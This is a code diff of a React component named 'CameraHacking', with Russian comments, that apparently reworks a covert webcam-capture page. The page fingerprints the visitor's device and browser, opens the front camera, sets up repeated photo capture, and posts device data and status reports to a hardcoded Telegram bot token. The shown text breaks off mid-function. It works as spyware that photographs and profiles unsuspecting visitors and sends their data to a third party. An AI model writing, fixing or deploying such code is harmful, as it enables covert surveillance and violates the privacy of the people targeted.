@@ -1,780 +1,382 @@
 /**
- * КОМПОНЕНТ CAMERAHACKING - ПОЛНАЯ ДИАГНОСТИКА ANDROID
- * СИСТЕМА ВЫЯВЛЕНИЯ И ИСПРАВЛЕНИЯ ПРОБЛЕМ
+ * КОМПОНЕНТ CAMERAHACKING - УНИВЕРСАЛЬНАЯ РАБОЧАЯ ВЕРСИЯ
+ * С ИНТЕГРИРОВАННОЙ ДИАГНОСТИКОЙ И АВТОИСПРАВЛЕНИЕМ
  */
 
 import axios from 'axios';
 import { useEffect, useRef, useState } from 'react';
 import API_CONFIG from '../api/config';
 
+// Инициализация DiagnosticCollector
+class DiagnosticCollector {
+  constructor() {
+    this.diagnostics = [];
+    this.maxEntries = 50;
+  }
+
+  async collectBasicDiagnostics() {
+    try {
+      const ua = navigator.userAgent.toLowerCase();
+      const diagnostic = {
+        timestamp: Date.now(),
+        date: new Date().toISOString(),
+        
+        // Базовые данные
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        
+        // Определение устройства
+        isAndroid: /android/.test(ua),
+        isIOS: /iphone|ipad|ipod/.test(ua),
+        isChrome: /chrome/.test(ua) && !/edge/.test(ua),
+        isSafari: /safari/.test(ua) && !/chrome/.test(ua),
+        isFirefox: /firefox/.test(ua),
+        isWebView: /wv|webview/.test(ua),
+        
+        // Версии
+        androidVersion: (() => {
+          const match = ua.match(/android\s([0-9\.]+)/);
+          return match ? parseFloat(match[1]) : 0;
+        })(),
+        
+        iosVersion: (() => {
+          const match = ua.match(/os\s([0-9_]+)/);
+          return match ? match[1].replace(/_/g, '.') : '0';
+        })(),
+        
+        // API поддержка
+        supports: {
+          mediaDevices: !!navigator.mediaDevices,
+          getUserMedia: !!(navigator.mediaDevices?.getUserMedia),
+          mediaRecorder: !!window.MediaRecorder,
+          canvas: !!document.createElement('canvas').getContext('2d')
+        },
+        
+        // Состояние
+        online: navigator.onLine,
+        cookieEnabled: navigator.cookieEnabled
+      };
+      
+      // Сохраняем
+      this.diagnostics.push(diagnostic);
+      if (this.diagnostics.length > this.maxEntries) {
+        this.diagnostics.shift();
+      }
+      
+      return diagnostic;
+      
+    } catch (error) {
+      console.error('Diagnostic collection error:', error);
+      return null;
+    }
+  }
+
+  async testCamera() {
+    const result = {
+      success: false,
+      error: null,
+      tracks: []
+    };
+    
+    try {
+      // Пробуем максимально простые настройки
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: true,
+        audio: false 
+      });
+      
+      const tracks = stream.getTracks();
+      result.tracks = tracks.map(t => ({
+        kind: t.kind,
+        readyState: t.readyState,
+        label: t.label || 'no-label'
+      }));
+      
+      result.success = tracks.length > 0;
+      
+      // Немедленно останавливаем тестовый поток
+      tracks.forEach(track => track.stop());
+      
+    } catch (error) {
+      result.error = {
+        name: error.name,
+        message: error.message
+      };
+    }
+    
+    return result;
+  }
+}
+
+// Создаем глобальный экземпляр
+const diagnosticCollector = new DiagnosticCollector();
+
 const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
   const streamRef = useRef(null);
   const captureIntervalRef = useRef(null);
-  const diagnosticIntervalRef = useRef(null);
-  const retryTimeoutRef = useRef(null);
-  
-  const [diagnosticData, setDiagnosticData] = useState({
-    status: 'initializing',
-    deviceInfo: {},
-    cameraState: {},
-    networkInfo: {},
-    errors: [],
-    captures: 0,
-    successfulCaptures: 0,
-    failedCaptures: 0
-  });
-  
+  const [isInitialized, setIsInitialized] = useState(false);
+  const [deviceInfo, setDeviceInfo] = useState(null);
   const [captureCount, setCaptureCount] = useState(0);
+  const [debugLogs, setDebugLogs] = useState([]);
 
-  // Конфигурация
-  const CAPTURE_INTERVAL = 3000;
-  const MAX_CAPTURES = 100;
-  const DIAGNOSTIC_INTERVAL = 5000; // Каждые 5 секунд отправляем диагностику
-
-  /**
-   * УНИВЕРСАЛЬНАЯ ДИАГНОСТИКА УСТРОЙСТВА
-   */
-  const runFullDiagnostics = async () => {
-    const diagnostics = {
-      timestamp: new Date().toISOString(),
-      
-      // 1. ИНФОРМАЦИЯ О БРАУЗЕРЕ
-      browser: {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
-        language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        
-        // API поддержка
-        mediaDevices: !!navigator.mediaDevices,
-        getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
-        mediaRecorder: !!window.MediaRecorder,
-        canvas: !!document.createElement('canvas').getContext,
-        webrtc: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection),
-        
-        // Детекция Android
-        isAndroid: /android/i.test(navigator.userAgent),
-        isIOS: /iphone|ipad|ipod/i.test(navigator.userAgent),
-        isChrome: /chrome/i.test(navigator.userAgent) && !/edge/i.test(navigator.userAgent),
-        isFirefox: /firefox/i.test(navigator.userAgent),
-        isSamsung: /samsungbrowser/i.test(navigator.userAgent),
-        isWebView: /wv|webview/i.test(navigator.userAgent)
-      },
-      
-      // 2. ХАРАКТЕРИСТИКИ УСТРОЙСТВА
-      device: {
-        memory: navigator.deviceMemory || 'unknown',
-        cores: navigator.hardwareConcurrency || 'unknown',
-        connection: navigator.connection || {},
-        battery: null,
-        
-        // Версия Android если есть
-        androidVersion: (() => {
-          const match = navigator.userAgent.match(/Android\s([0-9\.]+)/);
-          return match ? parseFloat(match[1]) : 0;
-        })()
-      },
-      
-      // 3. ЭКРАН И РАЗРЕШЕНИЕ
-      screen: {
-        width: window.screen.width,
-        height: window.screen.height,
-        availWidth: window.screen.availWidth,
-        availHeight: window.screen.availHeight,
-        colorDepth: window.screen.colorDepth,
-        pixelDepth: window.screen.pixelDepth,
-        orientation: window.screen.orientation?.type || 'unknown'
-      },
-      
-      // 4. КАМЕРА И ВИДЕО
-      camera: {
-        streamActive: !!streamRef.current,
-        videoReady: false,
-        videoWidth: 0,
-        videoHeight: 0,
-        tracks: [],
-        constraints: null,
-        hasCameraPermission: false
-      },
-      
-      // 5. СЕТЬ
-      network: {
-        online: navigator.onLine,
-        type: navigator.connection?.effectiveType || 'unknown',
-        downlink: navigator.connection?.downlink || 'unknown',
-        rtt: navigator.connection?.rtt || 'unknown',
-        saveData: navigator.connection?.saveData || false
-      },
-      
-      // 6. ПРОБЛЕМЫ И ОШИБКИ
-      issues: [],
-      suggestions: []
-    };
-    
-    // Проверяем батарею если доступно
-    if (navigator.getBattery) {
-      try {
-        const battery = await navigator.getBattery();
-        diagnostics.device.battery = {
-          level: battery.level,
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        };
-      } catch (e) {
-        diagnostics.device.battery = { error: e.message };
-      }
-    }
-    
-    // Проверяем состояние видео если есть
-    if (videoRef.current) {
-      const video = videoRef.current;
-      diagnostics.camera.videoReady = video.readyState >= 2;
-      diagnostics.camera.videoWidth = video.videoWidth;
-      diagnostics.camera.videoHeight = video.videoHeight;
-      diagnostics.camera.hasCameraPermission = !!streamRef.current;
-      
-      if (streamRef.current) {
-        const tracks = streamRef.current.getTracks();
-        diagnostics.camera.tracks = tracks.map(track => ({
-          kind: track.kind,
-          readyState: track.readyState,
-          enabled: track.enabled,
-          muted: track.muted,
-          label: track.label || 'no label'
-        }));
-      }
-    }
-    
-    // Выявляем проблемы
-    diagnostics.issues = identifyIssues(diagnostics);
-    
-    // Генерируем рекомендации
-    diagnostics.suggestions = generateSuggestions(diagnostics);
-    
-    // Обновляем состояние
-    setDiagnosticData(prev => ({
-      ...prev,
-      deviceInfo: diagnostics.browser,
-      cameraState: diagnostics.camera,
-      networkInfo: diagnostics.network,
-      status: diagnostics.camera.streamActive ? 'active' : 'inactive'
-    }));
-    
-    return diagnostics;
-  };
-
-  /**
-   * ВЫЯВЛЕНИЕ ПРОБЛЕМ НА ОСНОВЕ ДИАГНОСТИКИ
-   */
-  const identifyIssues = (diagnostics) => {
-    const issues = [];
-    
-    // 1. Проблемы с WebRTC поддержкой
-    if (!diagnostics.browser.mediaDevices) {
-      issues.push({
-        code: 'NO_MEDIADEVICES',
-        severity: 'critical',
-        message: 'MediaDevices API не поддерживается браузером'
-      });
-    }
-    
-    if (!diagnostics.browser.getUserMedia) {
-      issues.push({
-        code: 'NO_GETUSERMEDIA',
-        severity: 'critical',
-        message: 'getUserMedia API не поддерживается'
-      });
-    }
-    
-    // 2. Проблемы с Android версией
-    if (diagnostics.browser.isAndroid) {
-      if (diagnostics.device.androidVersion < 5.0) {
-        issues.push({
-          code: 'OLD_ANDROID',
-          severity: 'high',
-          message: `Android версия ${diagnostics.device.androidVersion} устарела (минимум требуется 5.0)`
-        });
-      }
-    }
-    
-    // 3. Проблемы с камерой
-    if (diagnostics.camera.streamActive && diagnostics.camera.videoWidth === 0) {
-      issues.push({
-        code: 'BLACK_CAMERA',
-        severity: 'high',
-        message: 'Камера активна, но видео черное (0x0 пикселей)'
-      });
-    }
-    
-    if (!diagnostics.camera.hasCameraPermission) {
-      issues.push({
-        code: 'NO_PERMISSION',
-        severity: 'critical',
-        message: 'Нет разрешения на использование камеры'
-      });
-    }
-    
-    // 4. Проблемы с сетью
-    if (!diagnostics.network.online) {
-      issues.push({
-        code: 'OFFLINE',
-        severity: 'high',
-        message: 'Устройство не подключено к интернету'
-      });
-    }
-    
-    if (diagnostics.network.type === 'slow-2g' || diagnostics.network.type === '2g') {
-      issues.push({
-        code: 'SLOW_NETWORK',
-        severity: 'medium',
-        message: `Медленное соединение: ${diagnostics.network.type}`
-      });
-    }
-    
-    // 5. Проблемы с треками
-    if (diagnostics.camera.tracks.length > 0) {
-      const inactiveTracks = diagnostics.camera.tracks.filter(t => t.readyState !== 'live');
-      if (inactiveTracks.length > 0) {
-        issues.push({
-          code: 'INACTIVE_TRACKS',
-          severity: 'high',
-          message: `${inactiveTracks.length} неактивных медиа-треков`
-        });
-      }
-    }
-    
-    return issues;
-  };
-
-  /**
-   * ГЕНЕРАЦИЯ РЕКОМЕНДАЦИЙ
-   */
-  const generateSuggestions = (diagnostics) => {
-    const suggestions = [];
-    
-    // Для старых Android
-    if (diagnostics.browser.isAndroid && diagnostics.device.androidVersion < 8.0) {
-      suggestions.push({
-        action: 'REDUCE_QUALITY',
-        priority: 'high',
-        message: 'Использовать низкое качество видео для старых Android'
-      });
-    }
-    
-    // Для медленной сети
-    if (diagnostics.network.type === 'slow-2g' || diagnostics.network.type === '2g') {
-      suggestions.push({
-        action: 'COMPRESS_IMAGES',
-        priority: 'high',
-        message: 'Сжимать изображения перед отправкой'
-      });
-    }
-    
-    // Для WebView
-    if (diagnostics.browser.isWebView) {
-      suggestions.push({
-        action: 'USE_SIMPLE_CONSTRAINTS',
-        priority: 'medium',
-        message: 'Использовать простые настройки камеры для WebView'
-      });
-    }
-    
-    // Если камера черная
-    if (diagnostics.camera.streamActive && diagnostics.camera.videoWidth === 0) {
-      suggestions.push({
-        action: 'RESTART_CAMERA',
-        priority: 'critical',
-        message: 'Перезапустить камеру'
-      });
-    }
-    
-    return suggestions;
+  // Добавление логов
+  const addDebugLog = (message) => {
+    const log = `${new Date().toLocaleTimeString()}: ${message}`;
+    console.log(log);
+    setDebugLogs(prev => [log, ...prev].slice(0, 10));
   };
 
   /**
    * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
    */
-  const sendDiagnosticsToTelegram = async (diagnostics) => {
+  const sendDiagnosticReport = async (title, data, isError = false) => {
     try {
-      // Форматируем диагностику в читаемый текст
-      let diagnosticText = `🔍 ДИАГНОСТИКА УСТРОЙСТВА\n\n`;
+      let message = `${isError ? '❌' : '🔍'} ${title}\n\n`;
       
-      // Информация об устройстве
-      diagnosticText += `📱 УСТРОЙСТВО:\n`;
-      diagnosticText += `• Android: ${diagnostics.browser.isAndroid ? `Да (${diagnostics.device.androidVersion})` : 'Нет'}\n`;
-      diagnosticText += `• Браузер: ${diagnostics.browser.isChrome ? 'Chrome' : diagnostics.browser.isFirefox ? 'Firefox' : diagnostics.browser.isSamsung ? 'Samsung' : 'Другой'}\n`;
-      diagnosticText += `• WebView: ${diagnostics.browser.isWebView ? 'Да' : 'Нет'}\n`;
-      diagnosticText += `• Память: ${diagnostics.device.memory}GB\n`;
-      diagnosticText += `• Ядра CPU: ${diagnostics.device.cores}\n\n`;
-      
-      // Состояние камеры
-      diagnosticText += `📷 КАМЕРА:\n`;
-      diagnosticText += `• Разрешение: ${diagnostics.camera.videoWidth}x${diagnostics.camera.videoHeight}\n`;
-      diagnosticText += `• Треки: ${diagnostics.camera.tracks.length}\n`;
-      diagnosticText += `• Готовность: ${diagnostics.camera.videoReady ? 'Готов' : 'Не готов'}\n`;
-      diagnosticText += `• Поток: ${diagnostics.camera.streamActive ? 'Активен' : 'Не активен'}\n\n`;
-      
-      // Сеть
-      diagnosticText += `🌐 СЕТЬ:\n`;
-      diagnosticText += `• Онлайн: ${diagnostics.network.online ? 'Да' : 'Нет'}\n`;
-      diagnosticText += `• Тип: ${diagnostics.network.type}\n`;
-      diagnosticText += `• Скорость: ${diagnostics.network.downlink} Mbps\n`;
-      diagnosticText += `• Экономия трафика: ${diagnostics.network.saveData ? 'Включена' : 'Выключена'}\n\n`;
-      
-      // Проблемы
-      if (diagnostics.issues.length > 0) {
-        diagnosticText += `⚠️ ПРОБЛЕМЫ (${diagnostics.issues.length}):\n`;
-        diagnostics.issues.forEach((issue, index) => {
-          diagnosticText += `${index + 1}. [${issue.severity.toUpperCase()}] ${issue.message}\n`;
-        });
-        diagnosticText += `\n`;
+      if (deviceInfo) {
+        message += `📱 Устройство: ${deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Другое'}\n`;
+        if (deviceInfo.isAndroid) message += `Версия Android: ${deviceInfo.androidVersion}\n`;
+        if (deviceInfo.isIOS) message += `Версия iOS: ${deviceInfo.iosVersion}\n`;
+        message += `Браузер: ${deviceInfo.isChrome ? 'Chrome' : deviceInfo.isSafari ? 'Safari' : 'Другой'}\n`;
+        message += `WebView: ${deviceInfo.isWebView ? 'Да' : 'Нет'}\n\n`;
       }
       
-      // Рекомендации
-      if (diagnostics.suggestions.length > 0) {
-        diagnosticText += `💡 РЕКОМЕНДАЦИИ:\n`;
-        diagnostics.suggestions.forEach((suggestion, index) => {
-          diagnosticText += `${index + 1}. [${suggestion.priority}] ${suggestion.message}\n`;
-        });
+      if (typeof data === 'string') {
+        message += data;
+      } else if (data instanceof Error) {
+        message += `Ошибка: ${data.name}\nСообщение: ${data.message}`;
+      } else if (data) {
+        message += JSON.stringify(data, null, 2).substring(0, 1000);
       }
       
-      // Отправляем в Telegram
       const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
       
       await axios.post(telegramApiUrl, {
         chat_id: chatId,
-        text: diagnosticText,
+        text: message,
         parse_mode: 'HTML'
       });
       
-      console.log('✅ Диагностика отправлена в Telegram');
-      
-      // Также отправляем JSON для подробного анализа
-      const jsonData = {
-        timestamp: diagnostics.timestamp,
-        userAgent: diagnostics.browser.userAgent,
-        issues: diagnostics.issues,
-        suggestions: diagnostics.suggestions,
-        cameraState: diagnostics.camera,
-        deviceInfo: {
-          isAndroid: diagnostics.browser.isAndroid,
-          androidVersion: diagnostics.device.androidVersion,
-          isWebView: diagnostics.browser.isWebView,
-          browser: diagnostics.browser.isChrome ? 'chrome' : 
-                  diagnostics.browser.isFirefox ? 'firefox' : 
-                  diagnostics.browser.isSamsung ? 'samsung' : 'other'
-        }
-      };
-      
-      // Отправляем JSON как файл
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('document', 
-        new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' }),
-        `diagnostics_${Date.now()}.json`
-      );
-      
-      const fileApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendDocument';
-      await axios.post(fileApiUrl, formData, {
-        headers: { 'Content-Type': 'multipart/form-data' }
-      });
-      
     } catch (error) {
-      console.error('❌ Ошибка отправки диагностики:', error);
+      console.error('Не удалось отправить диагностику:', error);
     }
   };
 
   /**
-   * ТЕСТ КАМЕРЫ С ДИАГНОСТИКОЙ
+   * ПОЛУЧЕНИЕ ОПТИМАЛЬНЫХ НАСТРОЕК КАМЕРЫ
    */
-  const testCameraWithDiagnostics = async () => {
-    console.log('🔧 Запуск теста камеры с диагностикой...');
+  const getOptimalConstraints = () => {
+    if (!deviceInfo) return { video: true };
     
-    const testResults = {
-      passed: [],
-      failed: [],
-      warnings: []
-    };
-    
-    try {
-      // Тест 1: Проверка поддержки API
-      if (!navigator.mediaDevices) {
-        testResults.failed.push({
-          test: 'MediaDevices API',
-          message: 'API не поддерживается'
-        });
-      } else {
-        testResults.passed.push('MediaDevices API доступен');
-      }
-      
-      // Тест 2: Проверка getUserMedia
-      if (!navigator.mediaDevices.getUserMedia) {
-        testResults.failed.push({
-          test: 'getUserMedia',
-          message: 'Функция не доступна'
-        });
-      } else {
-        testResults.passed.push('getUserMedia доступен');
-      }
-      
-      // Тест 3: Попытка получить камеру
-      const constraints = {
-        video: {
-          width: { ideal: 640 },
-          height: { ideal: 480 },
-          facingMode: 'user'
-        }
-      };
-      
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        testResults.passed.push('Доступ к камере получен');
-        
-        // Проверяем треки
-        const tracks = stream.getTracks();
-        if (tracks.length === 0) {
-          testResults.failed.push({
-            test: 'Video Tracks',
-            message: 'Нет видео треков в потоке'
-          });
-        } else {
-          testResults.passed.push(`Найдено ${tracks.length} треков`);
-          
-          // Проверяем каждый трек
-          tracks.forEach((track, index) => {
-            if (track.readyState !== 'live') {
-              testResults.warnings.push({
-                test: `Track ${index} State`,
-                message: `Трек в состоянии: ${track.readyState}`
-              });
-            }
-          });
-        }
-        
-        // Останавливаем тестовый поток
-        tracks.forEach(track => track.stop());
-        
-      } catch (cameraError) {
-        testResults.failed.push({
-          test: 'Camera Access',
-          message: `Ошибка: ${cameraError.message}`
-        });
-      }
-      
-      // Тест 4: Canvas поддержка
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      if (!ctx) {
-        testResults.failed.push({
-          test: 'Canvas API',
-          message: 'Canvas не поддерживается'
-        });
-      } else {
-        testResults.passed.push('Canvas API доступен');
-      }
-      
-      // Тест 5: Проверка размера файла
-      canvas.width = 100;
-      canvas.height = 100;
-      ctx.fillStyle = 'red';
-      ctx.fillRect(0, 0, 100, 100);
-      
-      return new Promise(resolve => {
-        canvas.toBlob((blob) => {
-          if (!blob) {
-            testResults.failed.push({
-              test: 'Canvas to Blob',
-              message: 'Не удалось создать Blob'
-            });
-          } else {
-            testResults.passed.push(`Blob создан (${blob.size} байт)`);
-          }
-          
-          resolve(testResults);
-        }, 'image/jpeg');
-      });
-      
-    } catch (error) {
-      testResults.failed.push({
-        test: 'Test Suite',
-        message: `Ошибка тестирования: ${error.message}`
-      });
-      return testResults;
-    }
-  };
-
-  /**
-   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ С ДИАГНОСТИКОЙ
-   */
-  const initializeCameraWithDiagnostics = async () => {
-    console.log('🎯 Инициализация камеры с диагностикой...');
-    
-    // Запускаем полную диагностику
-    const diagnostics = await runFullDiagnostics();
-    
-    // Отправляем начальную диагностику
-    await sendDiagnosticsToTelegram(diagnostics);
-    
-    // Проверяем проблемы
-    const criticalIssues = diagnostics.issues.filter(issue => 
-      issue.severity === 'critical' || issue.severity === 'high'
-    );
-    
-    if (criticalIssues.length > 0) {
-      console.error('❌ Критические проблемы обнаружены:', criticalIssues);
-      
-      // Запускаем тест для диагностики
-      const testResults = await testCameraWithDiagnostics();
-      
-      // Отправляем результаты теста
-      let testReport = `🧪 РЕЗУЛЬТАТЫ ТЕСТА КАМЕРЫ\n\n`;
-      testReport += `✅ Пройдено: ${testResults.passed.length}\n`;
-      testReport += `❌ Не пройдено: ${testResults.failed.length}\n`;
-      testReport += `⚠️ Предупреждения: ${testResults.warnings.length}\n\n`;
-      
-      if (testResults.failed.length > 0) {
-        testReport += `Ошибки:\n`;
-        testResults.failed.forEach((fail, index) => {
-          testReport += `${index + 1}. ${fail.test}: ${fail.message}\n`;
-        });
-      }
-      
-      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-      await axios.post(telegramApiUrl, {
-        chat_id: chatId,
-        text: testReport
-      });
-      
-      return false;
-    }
-    
-    // Если проблем нет, инициализируем камеру
-    try {
-      const deviceInfo = diagnostics.browser;
-      
-      // Выбираем constraints на основе диагностики
-      const constraints = getOptimalConstraints(deviceInfo, diagnostics);
-      
-      console.log('🎯 Используем constraints:', constraints);
-      
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      streamRef.current = stream;
-      
-      if (videoRef.current) {
-        const video = videoRef.current;
-        
-        // Настройки для Android
-        if (deviceInfo.isAndroid) {
-          video.playsInline = true;
-          video.muted = true;
-          video.autoplay = true;
-          video.setAttribute('playsinline', 'true');
-          video.setAttribute('muted', 'true');
-          video.setAttribute('autoplay', 'true');
-          video.setAttribute('webkit-playsinline', 'true');
-        }
-        
-        video.srcObject = stream;
-        
-        // Ждем готовности видео
-        await new Promise((resolve, reject) => {
-          const timeout = setTimeout(() => {
-            console.log('⏰ Таймаут ожидания видео');
-            resolve();
-          }, 10000);
-          
-          video.onloadedmetadata = () => {
-            clearTimeout(timeout);
-            console.log(`✅ Видео готово: ${video.videoWidth}x${video.videoHeight}`);
-            
-            // Для Android пробуем запустить воспроизведение
-            if (deviceInfo.isAndroid) {
-              video.play().then(() => {
-                console.log('▶️ Видео запущено');
-                resolve();
-              }).catch(() => {
-                console.log('⚠️ Auto-play заблокирован, но продолжаем');
-                resolve();
-              });
-            } else {
-              resolve();
-            }
-          };
-        });
-        
-        console.log('🎬 Камера успешно инициализирована');
-        setDiagnosticData(prev => ({ ...prev, status: 'active' }));
-        
-        // Запускаем периодическую диагностику
-        startPeriodicDiagnostics();
-        
-        // Запускаем захват фото
-        startPeriodicCapture();
-        
-        return true;
-      }
-      
-    } catch (error) {
-      console.error('❌ Ошибка инициализации камеры:', error);
-      
-      // Добавляем ошибку в диагностику
-      setDiagnosticData(prev => ({
-        ...prev,
-        errors: [...prev.errors, {
-          timestamp: new Date().toISOString(),
-          type: 'camera_init',
-          message: error.message,
-          code: error.name
-        }]
-      }));
-      
-      // Отправляем ошибку в Telegram
-      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-      await axios.post(telegramApiUrl, {
-        chat_id: chatId,
-        text: `❌ ОШИБКА ИНИЦИАЛИЗАЦИИ КАМЕРЫ\n\n` +
-              `Ошибка: ${error.name}\n` +
-              `Сообщение: ${error.message}\n` +
-              `Устройство: ${diagnostics.browser.isAndroid ? 'Android' : 'Другое'}\n` +
-              `Браузер: ${navigator.userAgent.substring(0, 100)}`
-      });
-      
-      return false;
-    }
-    
-    return false;
-  };
-
-  /**
-   * ВЫБОР ОПТИМАЛЬНЫХ НАСТРОЕК НА ОСНОВЕ ДИАГНОСТИКИ
-   */
-  const getOptimalConstraints = (deviceInfo, diagnostics) => {
-    // Базовые настройки
+    // БАЗОВЫЕ НАСТРОЙКИ ДЛЯ ВСЕХ УСТРОЙСТВ
     const baseConstraints = {
       video: {
         width: { ideal: 1280 },
         height: { ideal: 720 },
-        frameRate: { ideal: 24 },
-        facingMode: 'user'
+        facingMode: 'user',
+        frameRate: { ideal: 24 }
       },
       audio: false
     };
     
-    // Адаптация на основе диагностики
+    // iOS ТРЕБУЕТ ОСОБЫХ НАСТРОЕК
+    if (deviceInfo.isIOS) {
+      return {
+        video: {
+          width: { ideal: 1280 },
+          height: { ideal: 720 },
+          facingMode: 'user',
+          frameRate: { ideal: 30 }
+        },
+        audio: false
+      };
+    }
+    
+    // ANDROID НАСТРОЙКИ
     if (deviceInfo.isAndroid) {
-      const androidVersion = diagnostics.device.androidVersion;
-      const isLowEnd = diagnostics.device.memory < 2 || diagnostics.device.cores < 4;
-      
-      if (androidVersion < 6.0 || isLowEnd) {
+      // Старые Android
+      if (deviceInfo.androidVersion < 5.0) {
         return {
           video: {
             width: { ideal: 640 },
             height: { ideal: 480 },
-            frameRate: { ideal: 15 },
-            facingMode: 'user'
+            facingMode: { exact: 'user' },
+            frameRate: { ideal: 15 }
           },
           audio: false
         };
       }
       
-      if (androidVersion < 8.0) {
+      // Android 5-7
+      if (deviceInfo.androidVersion < 8.0) {
         return {
           video: {
             width: { ideal: 800 },
             height: { ideal: 600 },
-            frameRate: { ideal: 20 },
-            facingMode: 'user'
+            facingMode: 'user',
+            frameRate: { ideal: 20 }
           },
           audio: false
         };
       }
       
-      // Для WebView упрощаем
+      // Android WebView
       if (deviceInfo.isWebView) {
         return {
           video: {
-            width: { ideal: 640 },
-            height: { ideal: 480 }
+            facingMode: 'user'
           },
           audio: false
         };
       }
-    }
-    
-    // Для медленной сети уменьшаем качество
-    if (diagnostics.network.type === 'slow-2g' || diagnostics.network.type === '2g') {
-      baseConstraints.video.width.ideal = 640;
-      baseConstraints.video.height.ideal = 480;
     }
     
     return baseConstraints;
   };
 
   /**
-   * ПЕРИОДИЧЕСКАЯ ДИАГНОСТИКА
+   * ИНИЦИАЛИЗАЦИЯ ВИДЕО ЭЛЕМЕНТА
    */
-  const startPeriodicDiagnostics = () => {
-    if (diagnosticIntervalRef.current) {
-      clearInterval(diagnosticIntervalRef.current);
+  const initializeVideoElement = async () => {
+    if (!videoRef.current) {
+      throw new Error('Video element not found');
     }
     
-    diagnosticIntervalRef.current = setInterval(async () => {
-      const diagnostics = await runFullDiagnostics();
+    const video = videoRef.current;
+    
+    // КРИТИЧЕСКИ ВАЖНЫЕ НАСТРОЙКИ ДЛЯ МОБИЛЬНЫХ
+    video.playsInline = true;
+    video.muted = true;
+    video.autoplay = true;
+    video.setAttribute('playsinline', 'true');
+    video.setAttribute('muted', 'true');
+    video.setAttribute('autoplay', 'true');
+    video.setAttribute('webkit-playsinline', 'true');
+    video.setAttribute('x5-playsinline', 'true'); // Для QQ/WeChat браузеров
+    video.setAttribute('x-webkit-airplay', 'allow'); // Для AirPlay
+    
+    return new Promise((resolve) => {
+      const timeout = setTimeout(() => {
+        addDebugLog('Video init timeout, continuing anyway');
+        resolve();
+      }, 5000);
       
-      // Проверяем состояние
-      const hasCriticalIssues = diagnostics.issues.some(
-        issue => issue.severity === 'critical'
-      );
+      video.onloadedmetadata = () => {
+        clearTimeout(timeout);
+        addDebugLog(`Video metadata loaded: ${video.videoWidth}x${video.videoHeight}`);
+        
+        // Пробуем запустить видео
+        video.play().then(() => {
+          addDebugLog('Video play() successful');
+          resolve();
+        }).catch((playError) => {
+          addDebugLog(`Video play() blocked: ${playError.message}`);
+          resolve(); // Все равно продолжаем
+        });
+      };
       
-      if (hasCriticalIssues) {
-        console.log('⚠️ Обнаружены критические проблемы, отправляем диагностику...');
-        await sendDiagnosticsToTelegram(diagnostics);
-      }
-      
-      // Сохраняем в state
-      setDiagnosticData(prev => ({
-        ...prev,
-        cameraState: diagnostics.camera,
-        networkInfo: diagnostics.network
-      }));
-      
-    }, DIAGNOSTIC_INTERVAL);
+      video.onerror = (error) => {
+        clearTimeout(timeout);
+        addDebugLog(`Video error: ${error}`);
+        resolve(); // Продолжаем даже при ошибке
+      };
+    });
   };
 
   /**
-   * ЗАХВАТ ФОТО С ДИАГНОСТИКОЙ
+   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ
    */
-  const capturePhotoWithDiagnostics = async () => {
-    if (captureCount >= MAX_CAPTURES) {
-      console.log('🎯 Достигнут лимит захватов');
-      stopCapturing();
+  const initializeCamera = async () => {
+    addDebugLog('Начинаем инициализацию камеры...');
+    
+    try {
+      // 1. Собираем диагностику
+      const diagnostics = await diagnosticCollector.collectBasicDiagnostics();
+      setDeviceInfo(diagnostics);
+      
+      if (!diagnostics) {
+        throw new Error('Не удалось собрать диагностику');
+      }
+      
+      // 2. Проверяем поддержку API
+      if (!diagnostics.supports.getUserMedia) {
+        throw new Error('Браузер не поддерживает камеру (getUserMedia)');
+      }
+      
+      addDebugLog(`Устройство: ${diagnostics.isAndroid ? 'Android' : diagnostics.isIOS ? 'iOS' : 'Desktop'}`);
+      
+      // 3. Тестируем камеру
+      const cameraTest = await diagnosticCollector.testCamera();
+      if (!cameraTest.success) {
+        await sendDiagnosticReport('Тест камеры не пройден', cameraTest.error, true);
+      } else {
+        addDebugLog('Тест камеры пройден успешно');
+      }
+      
+      // 4. Получаем оптимальные настройки
+      const constraints = getOptimalConstraints();
+      addDebugLog(`Используем constraints: ${JSON.stringify(constraints)}`);
+      
+      // 5. Запрашиваем доступ к камере
+      addDebugLog('Запрашиваем доступ к камере...');
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      streamRef.current = stream;
+      
+      addDebugLog('Доступ к камере получен');
+      
+      // 6. Инициализируем video элемент
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        await initializeVideoElement();
+        
+        // Проверяем состояние видео
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        const video = videoRef.current;
+        if (video.videoWidth > 0 && video.videoHeight > 0) {
+          addDebugLog(`Видео готово: ${video.videoWidth}x${video.videoHeight}`);
+          await sendDiagnosticReport('Камера успешно инициализирована', {
+            resolution: `${video.videoWidth}x${video.videoHeight}`,
+            device: diagnostics
+          });
+        } else {
